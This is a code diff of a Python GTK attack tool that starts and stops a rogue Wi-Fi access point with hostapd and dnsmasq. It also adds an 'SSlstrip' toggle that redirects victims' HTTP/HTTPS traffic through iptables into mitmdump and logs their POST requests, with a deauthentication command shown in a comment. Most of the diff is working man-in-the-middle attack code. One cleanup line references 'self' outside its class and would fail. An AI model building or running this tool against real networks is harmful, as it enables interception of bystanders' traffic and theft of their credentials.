@@ -12,8 +12,9 @@ from os import fdopen, remove
 
 
 process_list = []
+started_service = {"ap": False, "sslstrip" : False}
 #p = subprocess.Popen(['airodump-ng', 'wlan0mon', '-w from_py', '--output-format', 'csv'])
-#process_list.append(p)
+#process_list.append('airodump-ng')
 
 ## Quick fix really dirty
 time.sleep(2)
@@ -51,10 +52,6 @@ def get_client():
             break
     csv_file.close()
     return client_list
-
-## TODO
-def filter_client():
-    return NotImplemented
 
 def replace(file_path, pattern, subst):
     #Create temp file
@@ -96,7 +93,6 @@ class SelectBSSIDWindow(Gtk.Window):
             self.AP_liststore_model.append(list(AP))
         self.current_filter_language = None
 
-        
         ## Define AP Treeview
         self.treeview_ap = Gtk.TreeView(model=self.AP_liststore_model)
         ## Scrollable Window
@@ -144,12 +140,12 @@ class SelectBSSIDWindow(Gtk.Window):
         self.box.pack_start(self.button_deauthclient, True, True, 0)
 
         ## Start fake AP
-        self.button_fakeAP = Gtk.Button(label="Start fake AP")
+        self.button_fakeAP = Gtk.Button(label="Start/Stop fake AP")
         self.button_fakeAP.connect("clicked", self.on_fakeAP_clicked)
         self.box.pack_start(self.button_fakeAP, True, True, 0)
 
         ## Start SSlstrip
-        self.button_sslstrip = Gtk.Button(label="SSlstrip attack")
+        self.button_sslstrip = Gtk.Button(label="Start/Stop SSlstrip attack")
         self.button_sslstrip.connect("clicked", self.on_button_sslstrip_clicked)
         self.box.pack_start(self.button_sslstrip, True, True, 0)
 
@@ -174,6 +170,10 @@ class SelectBSSIDWindow(Gtk.Window):
         self.button_set_value.connect("clicked", self.on_button_set_value_clicked)
         self.box.pack_start(self.button_set_value, True, True, 0)
 
+        ## Define info button
+        self.button_info = Gtk.Button(label='Info')
+        self.button_info.connect("clicked", self.on_info_clicked)
+        self.box.pack_start(self.button_info, True, True, 0)
 
     ######## Function
 
@@ -201,21 +201,52 @@ class SelectBSSIDWindow(Gtk.Window):
                     #subprocess.Popen(['aireplay-ng', '--deauth', '10', '-a', model_ap[treeiter_ap][0], '-c', client[0], 'wlan0mon', '-D'])
 
     def on_fakeAP_clicked(self, widget):
-        print (self.listen_interface_name.get_text())
-        config_system = subprocess.run(["/bin/bash",'../conf/config.sh'])
-        start_hostapd = subprocess.Popen(['/bin/bash', '../conf/start_hostapd.sh'])
-        process_list.append('hostapd')
-        start_dnsmasq = subprocess.Popen(['/bin/bash', '../conf/start_dnsmasq.sh'])
-        process_list.append('dnsmasq')
+        if not started_service['ap']:
+            config_system = subprocess.run(["/bin/bash",'../conf/config.sh'])
+            start_hostapd = subprocess.Popen(['/bin/bash', '../conf/start_hostapd.sh'])
+            process_list.append('hostapd')
+            start_dnsmasq = subprocess.Popen(['/bin/bash', '../conf/start_dnsmasq.sh'])
+            process_list.append('dnsmasq')
+            started_service['ap'] = True
+        else:
+            rollback_config = subprocess.run(["/bin/bash", '../conf/stop_config.sh'])
+            kill_dnsmasq = subprocess.run(["killall", 'dnsmasq'])
+            process_list.remove('dnsmasq')
+            time.sleep(0.5)
+            kill_hostapd = subprocess.run(["killall", 'hostapd'])
+            process_list.remove('hostapd')
+            time.sleep(0.5)
+            started_service['ap'] = False
 
     def on_button_sslstrip_clicked(self, widget):
-        start_proxy = subprocess.Popen(['../mitmdump', '-w', 'outfile', '~m post'])
-        process_list.append('mitmdump')
+        if not started_service['sslstrip']:
+            forward = subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', self.listen_interface_name.get_text(), '-p', 'tcp', '--match', 'multiport', '--dports 80,443', '-j REDIRECT', '--to-port', '8080'])
+            start_proxy = subprocess.Popen(['../mitmdump', '-w', 'outfile', '~m post'])
+            process_list.append('mitmdump')
+            started_service['sslstrip'] = True
+        else:
+            kill_mitmdump = subprocess.run(["killall", "mitmdump"])
+            stop_forward = forward = subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', self.listen_interface_name.get_text(), '-p', 'tcp', '--match', 'multiport', '--dports 80,443', '-j REDIRECT', '--to-port', '8080'])
+            process_list.remove('mitmdump')
+            started_service['sslstrip'] = False
 
     def on_button_set_value_clicked(self, widget):
         replace('../conf/hostapd.conf', 'interface=', self.listen_interface_name.get_text())
         replace('../conf/hostapd.conf', 'ssid=', self.ssid_name_entry.get_text())
         replace('../conf/dnsmasq.conf', 'interface=', self.listen_interface_name.get_text())
+
+    def on_info_clicked(self, widget):
+        dialog = Gtk.MessageDialog(
+            transient_for=self,
+            flags=0,
+            message_type=Gtk.MessageType.INFO,
+            buttons=Gtk.ButtonsType.OK,
+            text="Infos services",
+        )
+        dialog.format_secondary_text("Ap started : " + str(started_service['ap']) + "\nSslstrip started : " + str(started_service['sslstrip']))
+        dialog.run()
+        dialog.destroy()
+
 
 win = SelectBSSIDWindow()
 win.connect("destroy", Gtk.main_quit)
@@ -225,3 +256,10 @@ Gtk.main()
 for process in process_list:
     kill = subprocess.run(["killall", process])
     time.sleep(0.5)
+
+if started_service['ap']:
+    rollback_config = subprocess.run(["/bin/bash", '../conf/stop_config.sh'])
+
+if started_service['sslstrip']:
+    stop_forward = forward = subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-i', self.listen_interface_name.get_text(), '-p', 'tcp', '--match', 'multiport', '--dports 80,443', '-j REDIRECT', '--to-port', '8080'])
+
